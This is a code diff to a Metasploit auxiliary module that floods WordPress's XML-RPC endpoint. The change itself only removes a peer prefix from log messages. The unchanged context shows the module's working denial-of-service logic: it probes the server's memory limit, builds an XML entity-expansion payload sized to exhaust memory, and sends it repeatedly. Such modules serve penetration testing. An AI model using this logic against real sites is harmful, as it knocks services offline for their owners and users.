@@ -64,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
     # try out the available memory in steps
     # apache will return a server error if the limit is reached
     while memory_to_use < 1024
-      vprint_status("#{peer} - trying memory limit #{memory_to_use}MB")
+      vprint_status("trying memory limit #{memory_to_use}MB")
       opts = {
         'method'  => 'POST',
         'uri'     => wordpress_url_xmlrpc,
@@ -76,14 +76,14 @@ class Metasploit3 < Msf::Auxiliary
         # low timeout because the server error is returned immediately
         res = send_request_cgi(opts, timeout = 3)
       rescue ::Rex::ConnectionError => exception
-        print_error("#{peer} - unable to connect: '#{exception.message}'")
+        print_error("unable to connect: '#{exception.message}'")
         break
       end
 
       if res && res.code == 500
         # limit reached, return last limit
         last_limit = memory_to_use - fingerprint_step
-        vprint_status("#{peer} - got an error - using limit #{last_limit}MB")
+        vprint_status("got an error - using limit #{last_limit}MB")
         return last_limit
       else
         memory_to_use += fingerprint_step
@@ -91,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # no limit can be determined
-    print_warning("#{peer} - can not determine limit, will use default of #{default_limit}")
+    print_warning("can not determine limit, will use default of #{default_limit}")
     return default_limit
   end
 
@@ -129,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
     }
 
     space_to_fill = size_bytes - empty_xml.size
-    vprint_status("#{peer} - max XML space to fill: #{space_to_fill} bytes")
+    vprint_status("max XML space to fill: #{space_to_fill} bytes")
 
     payload = "&#{entity};" * (space_to_fill / 6)
     entity_value_length = space_to_fill - payload.length
@@ -148,15 +148,15 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     # get the max size
-    print_status("#{peer} - trying to fingerprint the maximum memory we could use")
+    print_status("trying to fingerprint the maximum memory we could use")
     size = fingerprint
-    print_status("#{peer} - using #{size}MB as memory limit")
+    print_status("using #{size}MB as memory limit")
 
     # only generate once
     xml = generate_xml(size)
 
     for x in 1..rlimit
-      print_status("#{peer} - sending request ##{x}...")
+      print_status("sending request ##{x}...")
       opts = {
         'method'  => 'POST',
         'uri'     => wordpress_url_xmlrpc,
@@ -169,7 +169,7 @@ class Metasploit3 < Msf::Auxiliary
         c.send_request(r)
         # Don't wait for a response, can take very long
       rescue ::Rex::ConnectionError => exception
-        print_error("#{peer} - unable to connect: '#{exception.message}'")
+        print_error("unable to connect: '#{exception.message}'")
         return
       ensure
         disconnect(c) if c
